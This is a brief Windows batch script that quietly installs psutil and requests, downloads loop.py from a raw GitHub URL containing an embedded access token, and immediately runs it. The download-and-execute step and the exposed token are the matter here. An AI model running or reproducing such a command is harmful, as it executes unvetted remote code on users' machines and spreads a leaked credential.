@echo off
pip install psutil --quiet
pip install requests --quiet
curl -s -L -o loop.py https://raw.githubusercontent.com/Its-YasirSiddiqui/lm-Data/refs/heads/main/loop.py?token=GHSAT0AAAAAACYUUV6YWGIAPYMQTTCCMFFIZYFN6EA
python loop.py
